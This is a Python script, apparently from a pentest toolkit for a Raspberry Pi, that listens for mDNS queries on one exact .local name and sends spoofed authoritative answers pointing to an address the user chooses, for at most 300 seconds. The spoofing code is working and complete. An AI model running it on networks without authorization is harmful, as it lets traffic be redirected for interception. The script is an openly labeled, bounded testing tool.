#!/usr/bin/env python3
# @name: Bounded mDNS Response Test
# @desc: Listens on 224.0.0.251:5353 for mDNS queries and responds with spoofed answers pointing to the Pi's IP.
# @category: network
# @danger: true
# @active: true
# @web: true
# @inputs: [{"name":"name","label":"Exact .local name","type":"text","placeholder":"test-device.local","required":true},{"name":"address","label":"Response IPv4 address","type":"text","required":true},{"name":"seconds","label":"Duration","type":"number","default":"30"}]

import ipaddress
import sys
from pathlib import Path
from scapy.all import DNS, DNSRR, IP, UDP, send, sniff
from payloads._web_input import request_input


def main() -> int:
    name = (sys.argv[1] if len(sys.argv) > 1 else "").rstrip(".").lower() + "."
    try:
        address = str(ipaddress.IPv4Address(sys.argv[2])); seconds = max(1, min(int(sys.argv[3]), 300))
    except (IndexError, ValueError):
        print("Address or duration is invalid.")
        return 2
    if not name.endswith(".local.") or len(name) > 254:
        print("The response name must end in .local.")
        return 2
    interfaces = sorted(p.name for p in Path("/sys/class/net").iterdir() if p.name != "lo")
    interface = str(request_input("Select network interface", input_type="select", choices=interfaces))
    responses = 0

    def answer(packet):
        nonlocal responses
        if DNS not in packet or packet[DNS].qr or not packet[DNS].qd:
            return
        query = packet[DNS].qd
        queried = bytes(query.qname).decode(errors="ignore").lower()
        if queried != name or query.qtype not in {1, 255}:
            return
        response = IP(dst="224.0.0.251", ttl=255) / UDP(sport=5353, dport=5353) / DNS(id=0, qr=1, aa=1, ancount=1, an=DNSRR(rrname=name, type="A", rclass=0x8001, ttl=30, rdata=address))
        send(response, iface=interface, verbose=False)
        responses += 1
        print(f"Answered {queried} → {address}", flush=True)

    print(f"Testing exact name {name} for {seconds} seconds…", flush=True)
    sniff(iface=interface, filter="udp port 5353", prn=answer, store=False, timeout=seconds)
    print(f"Sent {responses} response(s).")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
